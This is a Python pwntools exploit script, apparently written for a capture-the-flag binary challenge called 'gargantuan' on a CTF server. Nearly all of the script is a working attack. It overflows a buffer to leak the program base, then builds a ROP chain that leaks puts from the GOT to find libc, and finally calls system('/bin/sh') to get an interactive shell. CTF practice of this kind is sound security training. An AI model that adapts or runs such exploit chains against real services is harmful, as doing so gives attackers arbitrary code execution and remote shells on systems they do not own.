#! /usr/bin/python3
from pwn import *

REMOTE = "nc gargantuan.chal.cyberjousting.com 1352"
context.binary = elf = ELF("./chall")
context.timeout = Timeout.forever
context.log_console = sys.stderr
context.terminal = ["tmux", "splitw", "-h"]


libc = ELF("./libc.so.6") if args.R else ELF("/lib64/libc.so.6")


def main(bf=0):
    bf = bf # To shut up whatever Python syntax highlighter I use
    t = conn()

    cycle = cyclic_gen()
    def get(num):
        return cycle.get(num)

    def fill():
        return get(256) + b'\0' + get(255)

    t.sendafter(b"below:\n", fill())
    def do_something():
        for _ in range(3):
            t.send(fill())

    do_something()
    t.send(get(255) + b'\0' + p32(4) * (0x20//4) + b"AAAABBBB" + b'\06')

    t.recvuntil(b"TOO LATE! ")
    sleep(0.7)
    elf.address = int(t.recvline(), 16) - elf.sym["gargantuan"]

    pop_rdi = p64(elf.address + 0x00000000000011e0)
    pop_rbp = p64(elf.address + 0x0000000000001183)
    mov_zero_leave = p64(elf.address + 0x0000000000001310)
    ret = p64(elf.address + 0x0000000000001016)

    info(f"PIE base: {elf.address:x}")

    t.send(fill())
    t.send(fill())
    t.send(fill())
    t.send(fill())
    exploit = flat(
            pop_rdi,
            p64(elf.got["puts"]),
            pop_rbp,
            p64(elf.bss()+0x500),
            p64(elf.plt["puts"]),

            p64(elf.sym["gargantuan"]),
            )

    t.send(get(255) + b'\0' + p32(4) * (0x28//4) + exploit)

    # stack_leak = u64(t.recvline()[:-1].ljust(8, b'\x00'))
    # info(f"Stack leak: {stack_leak:x}")
    t.recvline()

    data = t.recvline()[:-1].ljust(8, b'\x00')
    libc.address = u64(data) - libc.sym["puts"]
    info(f"LIBC leak: {libc.address:x}")

    t.send(fill())
    t.send(fill())
    t.send(fill())
    t.send(fill())
    exploit = flat(
            pop_rdi,
            p64(next(libc.search(b'/bin/sh\x00'))),
            ret,
            p64(libc.sym["system"]),
            )
    t.send(get(255) + b'\0' + p32(4) * (0x28//4) + exploit)


    t.interactive()
    t.close()


# Handles a 'nc addr port' string like those provided in CTFs
def get_addr(s: str):
    s = s.strip().removeprefix('nc ')
    splitter = ':' if ':' in s else ' '
    addr = s.split(splitter)[0]
    port = int(s.split(splitter)[1])
    return (addr, port)


def conn() -> remote | process:
    if args.I or args.INFO or args.i or args.info:
        context.log_level = "info"
    else:
        context.log_level = "debug"

    if args.R or args.REMOTE or args.r or args.remote: # Remote host
        t = remote(*get_addr(REMOTE))
    else:
        t = process([elf.path])
        if args.G or args.GDB or args.g or args.gdb:
            gdb.attach(t, gdbscript="""
            b *gargantuan + 243
            c
            c
            """)
    return t

            # b *gargantuan
            # b *gargantuan +156

# Bruteforcing setup 
for i in range(1):
    print(f"{i=}")
    main(i)